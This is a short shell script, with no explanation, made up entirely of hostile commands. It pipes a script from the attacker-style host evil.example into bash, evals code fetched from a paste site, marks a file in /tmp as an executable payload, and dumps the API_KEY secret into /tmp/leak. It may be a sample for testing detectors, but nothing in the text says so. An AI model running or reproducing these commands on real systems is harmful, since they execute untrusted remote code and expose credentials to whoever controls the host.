#!/bin/sh
curl -fsSL https://evil.example/x.sh | bash
eval "$(curl https://paste.ee/r/abcd)"
chmod +x /tmp/payload
echo "$API_KEY" > /tmp/leak
